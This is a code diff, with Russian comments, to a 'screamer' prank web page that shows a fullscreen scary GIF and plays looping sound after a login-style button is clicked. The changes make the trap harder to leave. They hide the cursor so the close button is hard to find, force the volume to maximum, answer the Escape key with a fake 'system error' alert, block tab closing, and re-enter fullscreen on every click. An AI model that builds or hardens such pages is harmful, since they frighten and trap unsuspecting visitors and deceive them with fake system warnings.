@@ -14,7 +14,6 @@
             margin: 0;
             overflow: hidden;
         }
-        /* Кнопка для получения жеста пользователя */
         #start-button {
             padding: 15px 40px;
             font-size: 18px;
@@ -24,11 +23,7 @@
             border-radius: 4px;
             cursor: pointer;
             box-shadow: 0 2px 5px rgba(0,0,0,0.3);
-            transition: background-color 0.2s;
             z-index: 10;
-        }
-        #start-button:hover {
-            background-color: #1557b0;
         }
         #screamer-container {
             display: none;
@@ -39,6 +34,8 @@
             height: 100vh;
             background: #000;
             z-index: 99999;
+            /* Прячем курсор мыши, чтобы усложнить закрытие крестиком */
+            cursor: none; 
         }
         #screamer-container img {
             width: 100%;
@@ -49,23 +46,20 @@
 </head>
 <body>
 
-    <!-- Стартовая кнопка, обязательная для снятия блокировок браузера -->
     <button id="start-button" onclick="initiateScreamer()">Войти</button>
 
     <div id="screamer-container">
         <img src="7f3UOH.gif" alt="">
     </div>
 
-    <audio id="screamer-sound" src="caughtyou.mp3" loop preload="auto"></audio>
+    <!-- Добавлен атрибут autoplay для подстраховки и принудительный запуск звука на максимум -->
+    <audio id="screamer-sound" src="caughtyou.mp3" loop preload="auto" volume="1.0"></audio>
 
     <script>
         var isScreamerActive = false;
 
         function initiateScreamer() {
-            // Скрываем кнопку входа
             document.getElementById('start-button').style.display = 'none';
-            
-            // Запускаем основной скрипт в контексте клика
             activateScreamer();
         }
 
@@ -76,37 +70,46 @@
             
             container.style.display = 'block';
 
-            // Воспроизведение звука теперь разрешено, так как функция вызвана через onclick
+            // Принудительно выставляем громкость на максимум
+            sound.volume = 1.0;
+            
+            // Запуск аудио с детальным логированием ошибок в консоль
             sound.play().catch(function(error) {
-                console.log("Ошибка воспроизведения звука:", error);
+                console.error("Критическая ошибка аудио: ", error.message);
+                alert("Браузер заблокировал звук. Кликните еще раз по экрану!");
             });
 
-            // Запрос полноэкранного режима теперь легитимен
+            // Полноэкранный режим
             if (container.requestFullscreen) {
                 container.requestFullscreen().catch(function(err) {
-                    console.log("Ошибка перехода в полноэкранный режим:", err);
+                    console.log("Фуллскрин заблокирован: ", err.message);
                 });
             } else if (container.webkitRequestFullscreen) { 
                 container.webkitRequestFullscreen();
             }
 
+            // Защита от закрытия вкладки (вызовет стандартное системное окно)
             window.addEventListener('beforeunload', preventExit);
         }
       
         function preventExit(e) {
             if (!isScreamerActive) return;
             e.preventDefault();
-            e.returnValue = 'Изменения не сохранены.';
-            return e.returnValue;
+            // Современный стандарт требует присвоения пустой строки или true, текст браузер подставит сам
+            e.returnValue = ''; 
+            return '';
         }
 
+        // Блокировка клавиши Escape для предотвращения выхода из фуллскрина
         window.addEventListener('keydown', function(e) {
             if (isScreamerActive && (e.key === 'Escape' || e.keyCode === 27)) {
-                preventExit(e);
-                alert("Изменения не сохранены! Вы уверены, что хотите прервать проверку?");
+                e.preventDefault();
+                // Имитация окна предупреждения
+                alert("Ошибка системы! Завершите проверку.");
             }
         });
         
+        // Любой повторный клик возвращает фуллскрин и запускает звук
         document.addEventListener('click', function() {
             if (isScreamerActive) {
                 var container = document.getElementById('screamer-container');
@@ -116,7 +119,6 @@
 
                 if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                     if (container.requestFullscreen) container.requestFullscreen();
-                    else if (container.webkitRequestFullscreen) container.webkitRequestFullscreen();
                 }
             }
         });
